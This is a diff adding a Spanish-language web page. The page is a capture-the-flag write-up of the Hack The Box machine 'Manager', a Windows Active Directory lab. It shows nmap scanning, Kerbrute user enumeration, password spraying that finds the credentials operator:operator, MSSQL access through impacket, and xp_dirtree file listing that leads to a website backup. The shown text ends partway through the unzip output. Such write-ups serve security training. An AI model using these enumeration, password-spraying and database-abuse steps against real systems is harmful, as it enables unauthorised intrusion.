@@ -1,0 +1,611 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Manager (medium) · MiguelRega7</title>
+<meta name="description" content="- Manager es una máquina Windows de dificultad media que alberga un entorno de Active Directory con AD CS (Active Directory Certificate Services), un servidor web y un servidor SQL"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Manager (medium)</h1><div class="meta"><span>◷</span><time>2024-04-05</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- Manager es una máquina Windows de dificultad media que alberga un entorno de Active Directory con AD CS (Active Directory Certificate Services), un servidor web y un servidor SQL.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeraci-n-de-usuarios">Enumeración de usuarios</a><a href="#mssql">MSSQL</a><a href="#shell-as-raven">Shell as raven</a><a href="#user-flag">User flag</a><a href="#privilege-escalation">Privilege Escalation</a><a href="#esc7">ESC7</a><a href="#shell-as-administrator">Shell as Administrator</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/5ca8f0c721a9eca6f1aeb9ff4b4bac60.png">
+</p>
+
+<ul>
+<li>Manager es una máquina Windows de dificultad media que alberga un entorno de Active Directory con AD CS (Active Directory Certificate Services), un servidor web y un servidor SQL. El punto de entrada implica enumerar usuarios utilizando RID cycling y realizar un ataque de contraseña para acceder al servicio MSSQL. Luego, se utiliza el procedimiento xp_dirtree para explorar el sistema de archivos, descubriendo una copia de seguridad del sitio web en la raíz del servidor web. Extrayendo la copia de seguridad se revelan credenciales que se reutilizan para conectarse a través de WinRM al servidor. Finalmente, el atacante escala privilegios a través de AD CS mediante la explotación de ESC7.</li>
+</ul>
+<h2 id="portscan">PortScan</h2>
+<ul>
+<li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap sudo nmap -sCV -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49669,49670,49671,49721,56310,60346 10.10.11.236 -oN targeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 11:44 CST
+Nmap scan report for 10.10.11.236
+Host is up (0.17s latency).
+
+PORT      STATE    SERVICE       VERSION
+53/tcp    open     domain        Simple DNS Plus
+80/tcp    open     http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: Manager
+88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-17 00:45:13Z)
+135/tcp   open     msrpc         Microsoft Windows RPC
+139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+| Not valid before: 2023-07-30T13:51:28
+|_Not valid after:  2024-07-29T13:51:28
+|_ssl-date: 2024-03-17T00:46:50+00:00; +7h00m01s from scanner time.
+445/tcp   open     microsoft-ds?
+464/tcp   open     kpasswd5?
+593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+| Not valid before: 2023-07-30T13:51:28
+|_Not valid after:  2024-07-29T13:51:28
+|_ssl-date: 2024-03-17T00:46:48+00:00; +7h00m01s from scanner time.
+1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info:
+|   10.10.11.236:1433:
+|     Target_Name: MANAGER
+|     NetBIOS_Domain_Name: MANAGER
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: manager.htb
+|     DNS_Computer_Name: dc01.manager.htb
+|     DNS_Tree_Name: manager.htb
+|_    Product_Version: 10.0.17763
+| ms-sql-info:
+|   10.10.11.236:1433:
+|     Version:
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2024-03-17T00:46:50+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-03-15T21:10:24
+|_Not valid after:  2054-03-15T21:10:24
+3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-03-17T00:46:50+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+| Not valid before: 2023-07-30T13:51:28
+|_Not valid after:  2024-07-29T13:51:28
+3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-03-17T00:46:48+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+| Not valid before: 2023-07-30T13:51:28
+|_Not valid after:  2024-07-29T13:51:28
+5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+9389/tcp  open     mc-nmf        .NET Message Framing
+49667/tcp open     msrpc         Microsoft Windows RPC
+49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49670/tcp open     msrpc         Microsoft Windows RPC
+49671/tcp open     msrpc         Microsoft Windows RPC
+49721/tcp open     msrpc         Microsoft Windows RPC
+56310/tcp filtered unknown
+60346/tcp open     msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
+| smb2-time:
+|   date: 2024-03-17T00:46:08
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+</code></pre></div></div>
+<h2 id="enumeraci-n-de-usuarios">Enumeración de usuarios</h2>
+<ul>
+<li>Bueno primero vamos a agregar los dominios que tenemos al archivo <strong>/etc/hosts</strong>*.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap echo &quot;10.10.11.236 dc01.manager.htb manager.htb&quot; | sudo tee -a /etc/hosts
+10.10.11.236 dc01.manager.htb manager.htb
+</code></pre></div></div>
+<ul>
+<li>Estamos ante un <strong>Windows 10</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap crackmapexec smb 10.10.11.236
+SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+</code></pre></div></div>
+<ul>
+<li><p>Vamos a comenzar enumerando por el protocolo <strong>smb</strong> para ver si podemos ver recursos compartidos.</p>
+</li>
+<li><p>Solo vemos esto.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap crackmapexec smb 10.10.11.236 -u &quot;miguel&quot; -p &quot;&quot; --shares
+SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.236    445    DC01             [+] manager.htb\miguel:
+SMB         10.10.11.236    445    DC01             [+] Enumerated shares
+SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
+SMB         10.10.11.236    445    DC01             -----           -----------     ------
+SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.11.236    445    DC01             C$                              Default share
+SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.11.236    445    DC01             NETLOGON                        Logon server share
+SMB         10.10.11.236    445    DC01             SYSVOL                          Logon server share
+➜  nmap
+</code></pre></div></div>
+<ul>
+<li>Podemos enumerar usuarios tanto por <strong>kerberos</strong> y con <strong>crackmapexec</strong> vamos a usar <strong>kerberos</strong> primero.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content ./kerbrute userenum -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc dc01.manager.htb
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 03/16/24 - Ronnie Flathers @ropnop
+
+2024/03/16 12:01:09 &gt;  Using KDC(s):
+2024/03/16 12:01:09 &gt;  	dc01.manager.htb:88
+
+2024/03/16 12:01:12 &gt;  [+] VALID USERNAME:	 ryan@manager.htb
+2024/03/16 12:01:18 &gt;  [+] VALID USERNAME:	 guest@manager.htb
+2024/03/16 12:01:21 &gt;  [+] VALID USERNAME:	 cheng@manager.htb
+2024/03/16 12:01:23 &gt;  [+] VALID USERNAME:	 raven@manager.htb
+2024/03/16 12:01:38 &gt;  [+] VALID USERNAME:	 administrator@manager.htb
+2024/03/16 12:02:12 &gt;  [+] VALID USERNAME:	 Ryan@manager.htb
+2024/03/16 12:02:19 &gt;  [+] VALID USERNAME:	 Raven@manager.htb
+2024/03/16 12:02:37 &gt;  [+] VALID USERNAME:	 operator@manager.htb
+</code></pre></div></div>
+<ul>
+<li>Y bueno tenemos usuarios lo que podemos hacer ahora es un <strong>Password Spraying</strong> para ver si algun usuario usa su nombre de usuario como contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec smb 10.10.11.236 -u list.txt -p list.txt --no-brute --continue-on-success
+SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
+</code></pre></div></div>
+<ul>
+<li>Y bueno con esto sabemos que el usuario <strong>operator:operator</strong> son sus credenciales, pero si revisamos no podemos usar <strong>evil-winrm</strong> para conectarnos ala máquina.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec winrm 10.10.11.236 -u &quot;operator&quot; -p &quot;operator&quot;
+SMB         10.10.11.236    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
+HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
+WINRM       10.10.11.236    5985   DC01             [-] manager.htb\operator:operator
+</code></pre></div></div>
+<ul>
+<li>Tenemos privilegios de lectura en esos directorios.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec smb 10.10.11.236 -u &quot;operator&quot; -p &quot;operator&quot; --shares
+SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
+SMB         10.10.11.236    445    DC01             [+] Enumerated shares
+SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
+SMB         10.10.11.236    445    DC01             -----           -----------     ------
+SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.11.236    445    DC01             C$                              Default share
+SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share
+SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
+</code></pre></div></div>
+<h2 id="mssql">MSSQL</h2>
+<ul>
+<li>Si recordamos tenemos este puerto abierto.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info:
+|   10.10.11.236:1433:
+|     Target_Name: MANAGER
+|     NetBIOS_Domain_Name: MANAGER
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: manager.htb
+|     DNS_Computer_Name: dc01.manager.htb
+|     DNS_Tree_Name: manager.htb
+|_    Product_Version: 10.0.17763
+| ms-sql-info:
+|   10.10.11.236:1433:
+|     Version:
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2024-03-17T00:46:50+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-03-15T21:10:24
+|_Not valid after:  2054-03-15T21:10:24
+</code></pre></div></div>
+<ul>
+<li>Podemos ver si nuestro usuario es válido para usar ese servicio.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec mssql 10.10.11.236 -u &quot;operator&quot; -p &quot;operator&quot;
+MSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
+MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator
+</code></pre></div></div>
+<ul>
+<li>Sabiendo esto podemos usar <strong>impacket-mssqlclient</strong> para conectarnos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content impacket-mssqlclient -port 1433 10.10.11.236/operator:operator@10.10.11.236 -window
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
+[!] Press help for extra shell commands
+SQL (MANAGER\Operator  guest@master)&gt; SELECT name FROM sys.databases
+name
+------
+master
+
+tempdb
+
+model
+
+msdb
+
+SQL (MANAGER\Operator  guest@master)&gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora enumeramos las tablas.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">SQL (MANAGER\Operator  guest@master)&gt; SELECT * FROM sys.tables
+name                object_id   principal_id   schema_id   parent_object_id   type   type_desc    create_date   modify_date   is_ms_shipped   is_published   is_schema_published   lob_data_space_id   filestream_data_space_id   max_column_id_used   lock_on_bulk_load   uses_ansi_nulls   is_replicated   has_replication_filter   is_merge_published   is_sync_tran_subscribed   has_unchecked_assembly_data   text_in_row_limit   large_value_types_out_of_row   is_tracked_by_cdc   lock_escalation   lock_escalation_desc   is_filetable   is_memory_optimized   durability   durability_desc   temporal_type   temporal_type_desc   history_table_id   is_remote_data_archive_enabled   is_external   history_retention_period   history_retention_period_unit   history_retention_period_unit_desc   is_node   is_edge
+----------------   ----------   ------------   ---------   ----------------   ----   ----------   -----------   -----------   -------------   ------------   -------------------   -----------------   ------------------------   ------------------   -----------------   ---------------   -------------   ----------------------   ------------------   -----------------------   ---------------------------   -----------------   ----------------------------   -----------------   ---------------   --------------------   ------------   -------------------   ----------   ---------------   -------------   ------------------   ----------------   ------------------------------   -----------   ------------------------   -----------------------------   ----------------------------------   -------   -------
+spt_fallback_db     117575457           NULL           1                  0   b'U '   USER_TABLE   2003-04-08 09:18:01   2019-09-24 14:23:14               1              0                     0                   0                       NULL                    8                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0
+
+spt_fallback_dev    133575514           NULL           1                  0   b'U '   USER_TABLE   2003-04-08 09:18:02   2019-09-24 14:23:14               1              0                     0                   0                       NULL                   10                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0
+
+spt_fallback_usg    149575571           NULL           1                  0   b'U '   USER_TABLE   2003-04-08 09:18:04   2019-09-24 14:23:14               1              0                     0                   0                       NULL                    9                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0
+
+spt_monitor        1803153469           NULL           1                  0   b'U '   USER_TABLE   2019-09-24 14:21:40   2019-09-24 14:23:14               1              0                     0                   0                       NULL                   11                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0
+
+SQL (MANAGER\Operator  guest@master)&gt;
+</code></pre></div></div>
+<ul>
+<li><p>Pero nada importante.</p>
+</li>
+<li><p>No tenemos permiso de habilitar el <code>xp_cmdshell</code>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">SQL (MANAGER\Operator  guest@master)&gt; enable_xp_cmdshell
+[-] ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
+[-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
+[-] ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
+[-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
+SQL (MANAGER\Operator  guest@master)&gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a enumerar <strong>files</strong> con <strong>xp_dirtree</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">SQL (MANAGER\Operator  guest@master)&gt; xp_dirtree C:\
+subdirectory                depth   file
+-------------------------   -----   ----
+$Recycle.Bin                    1      0
+
+Documents and Settings          1      0
+
+inetpub                         1      0
+
+PerfLogs                        1      0
+
+Program Files                   1      0
+
+Program Files (x86)             1      0
+
+ProgramData                     1      0
+
+Recovery                        1      0
+
+SQL2019                         1      0
+
+System Volume Information       1      0
+
+Users                           1      0
+
+Windows                         1      0
+</code></pre></div></div>
+<ul>
+<li>Y bueno encontramos directorio interesante donde encontramos un <strong>.zip</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">SQL (MANAGER\Operator  guest@master)&gt; xp_dirtree C:\inetpub\wwwroot
+subdirectory                      depth   file
+-------------------------------   -----   ----
+about.html                            1      1
+
+contact.html                          1      1
+
+css                                   1      0
+
+images                                1      0
+
+index.html                            1      1
+
+js                                    1      0
+
+service.html                          1      1
+
+web.config                            1      1
+
+website-backup-27-07-23-old.zip       1      1
+
+SQL (MANAGER\Operator  guest@master)&gt;
+</code></pre></div></div>
+<h1>Zip</h1>
+<ul>
+<li>Vamos a descargar el comprimido fácilmente.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content wget http://10.10.11.236/website-backup-27-07-23-old.zip
+--2024-03-16 12:30:07--  http://10.10.11.236/website-backup-27-07-23-old.zip
+Connecting to 10.10.11.236:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1045328 (1021K) [application/x-zip-compressed]
+Saving to: ‘website-backup-27-07-23-old.zip’
+
+website-backup-27-07-23-old.zip      100%[=====================================================================&gt;]   1021K   933KB/s    in 1.1s
+
+2024-03-16 12:30:08 (933 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a descomprimirlo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content unzip website-backup-27-07-23-old.zip
+Archive:  website-backup-27-07-23-old.zip
+  inflating: .old-conf.xml
+  inflating: about.html
+  inflating: contact.html
+  inflating: css/bootstrap.css
+  inflating: css/responsive.css
+  inflating: css/style.css
+  inflating: css/style.css.map
+  inflating: css/style.scss
+  inflating: images/about-img.png
+  inflating: images/body_bg.jpg
+ extracting: images/call.png
+ extracting: images/call-o.png
+  inflating: images/client.jpg
+  inflating: images/contact-img.jpg
+ extracting: images/envelope.png
+ extracting: images/envelope-o.png
+  inflating: images/hero-bg.jpg
+ extracting: images/location.png
+ extracting: images/location-o.png
+ extracting: images/logo.png
+  inflating: images/menu.png
+ extracting: images/next.png
+ extracting: images/next-white.png
+  inflating: images/offer-img.jpg
+  inflating: images/prev.png
+ extracting: images/prev-white.png
+ extracting: images/quote.png
+ extracting: images/s-1.png
+ extracting: images/s-2.png
+ extracting: images/s-3.png
+ extracting: images/s-4.png
+ extracting: images/search-icon.png
